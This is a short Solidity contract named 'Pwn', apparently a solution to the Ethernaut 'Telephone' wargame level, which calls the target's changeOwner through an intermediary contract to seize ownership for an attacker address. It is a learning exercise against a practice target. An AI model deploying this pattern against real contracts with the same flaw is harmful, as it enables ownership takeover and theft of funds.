// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Ethernaut.sol";

contract Pwn {

    Telephone private immutable target;
    address private immutable attacker;

    constructor(address _target, address _attacker) {
        target = Telephone(_target);
        attacker = _attacker;
    }

    function pwn() external {
        target.changeOwner(attacker);
    }
}
